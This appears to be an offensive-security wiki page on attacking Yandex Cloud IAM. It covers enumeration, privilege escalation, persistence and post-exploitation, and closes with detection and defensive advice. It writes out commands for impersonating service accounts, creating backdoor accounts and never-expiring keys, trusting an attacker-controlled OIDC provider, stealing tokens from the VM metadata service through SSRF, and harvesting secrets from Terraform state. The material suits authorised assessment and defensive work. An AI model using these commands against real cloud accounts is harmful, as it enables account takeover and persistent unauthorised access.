# Yandex Cloud - IAM (Identity and Access Management) Techniques

## Service Overview

Yandex Cloud IAM is the central identity and access management service that controls authentication and authorization for all Yandex Cloud resources. It manages user accounts, service accounts, roles, tokens, and keys. IAM is the first and most critical service to target in any Yandex Cloud assessment because it governs access to everything else.

**Key Concepts:**
- **Resource Hierarchy**: Organization > Cloud > Folder > Resources (roles inherit downward)
- **Account Types**: Yandex accounts, federated accounts (SAML), local accounts (user pools), service accounts
- **Authentication**: IAM tokens, OAuth tokens, API keys, static access keys, authorized keys
- **Authorization**: RBAC with primitive roles (`viewer`, `editor`, `admin`) and granular service roles

---

## Enumeration

### Enumerate Current Identity

After gaining initial access (e.g., stolen token, compromised VM), determine the current identity context.

```bash
# Get current authenticated identity info via CLI
yc iam whoami

# Get the current CLI profile configuration
yc config list

# List all configured CLI profiles
yc config profile list
```

### Enumerate Organizations

```bash
# List organizations the current identity belongs to
yc organization-manager organization list
```

### Enumerate Clouds and Folders

```bash
# List all clouds accessible to the current identity
yc resource-manager cloud list

# List folders within a specific cloud
yc resource-manager folder list --cloud-id <cloud_id>
```

### Enumerate Users and Accounts

```bash
# List all users in the organization
yc organization-manager user list --organization-id <org_id>

# List all federated users
yc organization-manager user list --organization-id <org_id> --federation-id <fed_id>
```

### Enumerate Service Accounts

Service accounts are high-value targets because they often carry powerful roles and their keys can be extracted.

```bash
# List all service accounts in a folder
yc iam service-account list --folder-id <folder_id>

# Get detailed info about a service account
yc iam service-account get <service_account_id>

# List service accounts across all folders in a cloud
for folder in $(yc resource-manager folder list --cloud-id <cloud_id> --format json | jq -r '.[].id'); do
  echo "=== Folder: $folder ==="
  yc iam service-account list --folder-id "$folder"
done
```

### Enumerate Roles and Access Bindings

```bash
# List role bindings on a folder
yc resource-manager folder list-access-bindings <folder_id>

# List role bindings on a cloud
yc resource-manager cloud list-access-bindings <cloud_id>

# List role bindings on a specific service account
yc iam service-account list-access-bindings <service_account_id>

# List all available roles (to understand the permission landscape)
yc iam role list
```

### Enumerate Keys for Service Accounts

```bash
# List API keys for a service account
yc iam api-key list --service-account-id <sa_id>

# List authorized keys for a service account
yc iam key list --service-account-id <sa_id>

# List static access keys for a service account
yc iam access-key list --service-account-id <sa_id>
```

### Enumerate Identity Federations

Identity federations represent external IdP trust relationships that could be abused.

```bash
# List identity federations in the organization
yc organization-manager federation saml list --organization-id <org_id>

# List workload identity federations in a folder
yc iam workload-identity federation list --folder-id <folder_id>

# List federated credentials for a workload identity federation
yc iam workload-identity federated-credential list --federation-id <wlif_id>
```

### Enumerate Service Control (Service Agents)

```bash
# List services with access control status
yc iam service-control list --cloud-id <cloud_id>

# Get a specific service's status
yc iam service-control get <service_id> --cloud-id <cloud_id>
```

### Enumerate Refresh Tokens

```bash
# List refresh tokens issued for the current user
yc iam refresh-token list
```

### API-Based Enumeration

When CLI is unavailable, use the REST API directly with a stolen IAM token:

```bash
# List service accounts via API
curl -s -H "Authorization: Bearer <IAM_TOKEN>" \
  "https://iam.api.cloud.yandex.net/iam/v1/serviceAccounts?folderId=<folder_id>"

# List access bindings on a resource via API
curl -s -H "Authorization: Bearer <IAM_TOKEN>" \
  "https://resource-manager.api.cloud.yandex.net/resource-manager/v1/folders/<folder_id>:listAccessBindings"

# List API keys for a service account
curl -s -H "Authorization: Bearer <IAM_TOKEN>" \
  "https://iam.api.cloud.yandex.net/iam/v1/apiKeys?serviceAccountId=<sa_id>"

# List authorized keys for a service account
curl -s -H "Authorization: Bearer <IAM_TOKEN>" \
  "https://iam.api.cloud.yandex.net/iam/v1/keys?serviceAccountId=<sa_id>"
```

---

## Privilege Escalation

### iam.serviceAccounts.tokenCreator - Impersonation to Service Account

The `iam.serviceAccounts.tokenCreator` role allows generating IAM tokens for a service account (impersonation). If a user has this role on a high-privilege service account, they can escalate to that service account's permissions.

```bash
# Impersonate a service account via CLI
yc iam create-token --impersonate-service-account-id <sa_id>

# Use impersonation inline with any command
yc compute instance list --folder-name my-folder \
  --impersonate-service-account-id <sa_id>
```

**Risk**: A user with `tokenCreator` on a service account that has `admin` on a cloud effectively has `admin` on that cloud.

### iam.serviceAccounts.keyAdmin - Create New Keys for Service Accounts

If you have key management roles (`accessKeyAdmin`, `apiKeyAdmin`, `authorizedKeyAdmin`, or `keyAdmin`) for a service account, you can create new authentication keys without deleting existing ones.

```bash
# Create a new API key for a service account
yc iam api-key create --service-account-id <sa_id>

# Create a new authorized key (RSA key pair for IAM token generation)
yc iam key create --service-account-id <sa_id> --output key.json

# Create a new static access key (for AWS-compatible APIs like S3)
yc iam access-key create --service-account-id <sa_id>
```

**Risk**: Authorized keys have unlimited lifetime. Once created, an attacker has persistent access until the key is explicitly deleted. Static access keys also have no expiration date.

### editor Role on a Service Account - Indirect Privilege Escalation

The `editor` role on a service account allows updating and deleting the service account, as well as managing its keys. Combined with the service account's own roles, this creates an escalation path.

```bash
# If you have editor on a high-privilege service account:
# 1. Create keys for it
yc iam key create --service-account-id <sa_id> --output key.json

# 2. Authenticate as that service account
yc config profile create stolen-sa
yc config set service-account-key key.json

# 3. Now operate with that SA's permissions
yc compute instance list
```

### Exploiting Role Inheritance

Roles assigned at the organization or cloud level are inherited by all child resources. A user with `editor` at the cloud level has `editor` on every folder and resource in that cloud.

```bash
# Check cloud-level bindings for overprivileged assignments
yc resource-manager cloud list-access-bindings <cloud_id>

# Check organization-level bindings
yc organization-manager organization list-access-bindings <org_id>
```

### Exploiting allAuthenticatedUsers / allUsers Public Groups

If resources have roles assigned to `system:allAuthenticatedUsers` or `system:allUsers`, any authenticated Yandex Cloud user (or any unauthenticated user, respectively) can access them.

```bash
# Check for public group bindings on a folder
yc resource-manager folder list-access-bindings <folder_id>
# Look for entries with subject type "system" and ID "allAuthenticatedUsers" or "allUsers"
```

**Risk**: The docs explicitly warn that assigning roles to `allAuthenticatedUsers` gives access to **every** user authenticated in all of Yandex Cloud, not just your organization. This is a common misconfiguration.

### Workload Identity Federation Abuse

If you can create federated credentials in a workload identity federation, you can link an external OIDC identity to a Yandex Cloud service account, enabling token exchange from an external system.

```bash
# Create federated credentials linking an external subject to a service account
yc iam workload-identity federated-credential create \
  --federation-id <wlif_id> \
  --service-account-id <sa_id> \
  --external-subject-id <external_subject>
```

**Required roles**: `iam.serviceAccounts.federatedCredentialEditor` on the SA + `iam.workloadIdentityFederations.user` on the folder.

---

## Persistence

### Create Long-Lived Authorized Keys

Authorized keys (RSA-2048/4096) have **unlimited validity** and can be used to generate IAM tokens at any time. This is the primary persistence mechanism.

```bash
# Create an authorized key for a service account
yc iam key create --service-account-id <sa_id> --output key.json

# The key file contains both public and private parts
# It can generate IAM tokens indefinitely:
yc iam create-token --key-file key.json
```

**Detection Note**: The private key starts with `PLEASE DO NOT REMOVE THIS LINE! Yandex.Cloud SA Key ID...` which can be used for leak detection scanning.

### Create Static Access Keys (No Expiration)

Static access keys for AWS-compatible APIs (S3, Message Queue, etc.) have **no expiration date**.

```bash
# Create a static access key
yc iam access-key create --service-account-id <sa_id>
# Returns: key_id (YC...) and secret (YC...)
# These never expire
```

**Key format identifiers**:
- Key ID: 25 chars, starts with `YC`
- Secret: 40 chars, starts with `YC`

### Create API Keys

API keys are used for simplified authentication with specific services. By default they have no expiration unless explicitly scoped.

```bash
# Create an unscoped API key (broad access)
yc iam api-key create --service-account-id <sa_id>

# The key can be used with header: Authorization: Api-Key <key>
```

### Create Backdoor Service Account

If you have `iam.serviceAccounts.admin` on a folder, you can create new service accounts with their own keys.

```bash
# Create a new service account
yc iam service-account create --name backup-monitor --folder-id <folder_id>

# Assign it a powerful role
yc resource-manager folder add-access-binding <folder_id> \
  --role editor \
  --subject serviceAccount:<new_sa_id>

# Create an authorized key for persistent access
yc iam key create --service-account-id <new_sa_id> --output backdoor-key.json
```

### Link Service Account to VM for Metadata-Based Persistence

If a service account is linked to a VM, IAM tokens are automatically available via the metadata service (`169.254.169.254`). Linking a high-privilege SA to a compromised VM provides persistent token access.

```bash
# From inside a compromised VM, get IAM token from metadata
curl -s -H "Metadata-Flavor: Google" \
  "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"
# Returns: {"access_token":"CggVAgAAA...","expires_in":39944,"token_type":"Bearer"}
```

### Establish Workload Identity Federation Trust

Create a workload identity federation that trusts an external OIDC provider you control, linking it to a high-privilege service account.

```bash
# Create a workload identity federation trusting your OIDC provider
yc iam workload-identity federation create \
  --name external-ci \
  --folder-id <folder_id> \
  --issuer "https://your-oidc-provider.example.com" \
  --jwks-url "https://your-oidc-provider.example.com/.well-known/jwks.json" \
  --audience "yandex-cloud"

# Link it to a service account
yc iam workload-identity federated-credential create \
  --federation-id <wlif_id> \
  --service-account-id <sa_id> \
  --external-subject-id "your-external-identity"

# Now exchange external JWT for Yandex Cloud IAM token
curl -X POST "https://auth.cloud.yandex.com/oauth/token" \
  -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange" \
  -d "subject_token=<external_jwt>" \
  -d "subject_token_type=urn:ietf:params:oauth:token-type:jwt"
```

### Persist via SAML Identity Federation

If you can modify the organization's SAML federation configuration, you can add a malicious IdP or manipulate existing federation settings to maintain access through federated authentication.

### Maintain Refresh Tokens

Refresh tokens for federated users are valid for 31 days and auto-renew when used within the last 7 days. Continuously using a refresh token provides indefinite access.

---

## Post-Exploitation

### Steal OAuth Tokens

OAuth tokens for Yandex accounts are valid for **1 year** and can be used to generate IAM tokens. If found in configuration files, environment variables, or CI/CD pipelines, they provide long-term access.

```bash
# Common locations for OAuth tokens:
# ~/.config/yandex-cloud/config.yaml (CLI config)
# Environment variables
# CI/CD pipeline secrets
# Terraform provider configs: token = "y3_..."

# OAuth token format: starts with y[0-3]_ (e.g., y3_Vdheub7w...)

# Exchange OAuth token for IAM token
curl -s -X POST "https://iam.api.cloud.yandex.net/iam/v1/tokens" \
  -d '{"yandexPassportOauthToken": "<oauth_token>"}'
```

### Steal IAM Tokens from VM Metadata Service

Any process running on a VM with a linked service account can obtain IAM tokens.

```bash
# From inside a VM:
curl -s -H "Metadata-Flavor: Google" \
  "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"

# Also enumerate the SA email/id from metadata
curl -s -H "Metadata-Flavor: Google" \
  "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email"
```

**SSRF Note**: If you find an SSRF vulnerability in an application running on a Yandex Cloud VM, you can use it to reach the metadata service at `169.254.169.254` and steal the service account's IAM token.

### Extract Service Account Keys from Terraform State

Terraform state files may contain service account keys in plaintext.

```bash
# Search for keys in terraform state
grep -r "private_key" terraform.tfstate
grep -r "secret_key" terraform.tfstate
grep -r "YC" terraform.tfstate  # Static key prefix
```

### Enumerate All Permissions After Compromise

After compromising an identity, map out everything it can access:

```bash
# Check what roles the compromised identity has on each folder
for folder in $(yc resource-manager folder list --cloud-id <cloud_id> --format json | jq -r '.[].id'); do
  echo "=== Folder: $folder ==="
  yc resource-manager folder list-access-bindings "$folder"
done

# List all resources in accessible folders
yc compute instance list --folder-id <folder_id>
yc storage bucket list --folder-id <folder_id>
yc lockbox secret list --folder-id <folder_id>
yc managed-kubernetes cluster list --folder-id <folder_id>
yc serverless function list --folder-id <folder_id>
```

### Lateral Movement via Service Account Linking

Service accounts linked to VMs, functions, and containers provide automatic IAM token access. Compromising any of these compute resources gives access to the linked SA's permissions.

```bash
# List VMs and their linked service accounts
yc compute instance list --format json | jq '.[] | {name, service_account_id}'

# List serverless functions and their SAs
yc serverless function list --format json | jq '.[] | {name, service_account_id}'
```

### Credential Harvesting from Key Files

```bash
# Authorized key files contain a recognizable header:
# "PLEASE DO NOT REMOVE THIS LINE! Yandex.Cloud SA Key ID..."
# Search for these in filesystem, repos, CI/CD artifacts

# API key format in Authorization header:
# Authorization: Api-Key <key>

# IAM token format (regex):
# t1\.[A-Z0-9a-z_-]+[=]{0,2}\.[A-Z0-9a-z_-]{86}[=]{0,2}

# Static access key format:
# Key ID: 25 chars starting with "YC"
# Secret: 40 chars starting with "YC"
```

---

## Credential Format Reference

| Credential | Format | Lifetime | Notes |
|---|---|---|---|
| IAM Token | Starts with `t1.` | ~12 hours | Preferred short-lived auth |
| OAuth Token | Starts with `y[0-3]_` | 1 year | Yandex account users only |
| API Key | Secret string | Unlimited (unless scoped) | Service account only |
| Authorized Key | RSA key pair (JSON file) | Unlimited | Used to generate IAM tokens |
| Static Access Key | ID: `YC...` (25 chars), Secret: `YC...` (40 chars) | Unlimited | For AWS-compatible APIs |
| Refresh Token | Opaque | 31 days (auto-renews) | Federated users, CLI |

---

## Key IAM Roles for Attackers

| Role | What it Enables |
|---|---|
| `iam.serviceAccounts.tokenCreator` | Impersonate any SA this role is granted for; generate IAM tokens |
| `iam.serviceAccounts.keyAdmin` | Create/delete all key types for a service account |
| `iam.serviceAccounts.accessKeyAdmin` | Create/delete static access keys |
| `iam.serviceAccounts.apiKeyAdmin` | Create/delete API keys |
| `iam.serviceAccounts.authorizedKeyAdmin` | Create/delete authorized keys (RSA) |
| `iam.serviceAccounts.admin` | Create/delete service accounts in a folder |
| `iam.serviceAccounts.user` | Use a service account (required for linking SA to VMs, functions) |
| `admin` | Full control including granting/revoking roles to others |
| `editor` | Create/modify/delete resources (but cannot manage access bindings) |
| `resource-manager.clouds.owner` | Supreme privilege on a cloud; can assign this role to others |
| `iam.workloadIdentityFederations.editor` | Create/modify workload identity federations |
| `iam.serviceAccounts.federatedCredentialEditor` | Link external identities to service accounts |

---

## Detection and Logging

### Audit Trails

Yandex Cloud Audit Trails logs IAM operations. Key events to monitor:

- `CreateServiceAccount` - New service accounts being created
- `CreateAccessKey` / `CreateApiKey` / `CreateKey` - New keys being generated
- `DeleteAccessKey` / `DeleteApiKey` / `DeleteKey` - Keys being rotated (or cleaned up)
- `SetAccessBindings` / `UpdateAccessBindings` - Role assignments changing
- `CreateIamToken` - Token generation (especially via impersonation)
- `ImpersonateServiceAccount` - Direct impersonation events

### Key Usage Tracking

Yandex Cloud tracks when keys were last used (`LAST AUTHENTICATED AT` field). Regular review of this field can identify unused or suspiciously active keys.

---

## Defensive Recommendations

1. **Avoid long-lived credentials**: Prefer IAM tokens over API keys, authorized keys, and static keys
2. **Scope API keys**: Always set scope and validity limits when creating API keys
3. **Never assign roles to `allAuthenticatedUsers`**: This grants access to every Yandex Cloud user globally
4. **Audit role inheritance**: Roles at cloud/org level cascade down to all resources
5. **Use workload identity federations** instead of static keys for CI/CD integrations
6. **Monitor Audit Trails** for key creation, role changes, and impersonation events
7. **Restrict `tokenCreator` role**: This is equivalent to having the SA's permissions
8. **Separate service accounts per workload**: Don't reuse high-privilege SAs across many resources
9. **Enable DPoP for refresh tokens**: Binds tokens to specific devices using YubiKey
10. **Rotate credentials regularly**: Authorized keys and static access keys have no expiration

---

## References

- Yandex Cloud IAM Documentation: `en/iam/`
- Access Control Concepts: `en/iam/concepts/access-control/`
- Service Account Operations: `en/iam/operations/sa/`
- Authentication Methods: `en/iam/concepts/authorization/`
- Compromised Credentials Guide: `en/iam/operations/compromised-credentials.md`
- Security Best Practices: `en/iam/best-practices/using-iam-securely.md`
- VM Metadata Authentication: `en/compute/operations/vm-connect/auth-inside-vm.md`
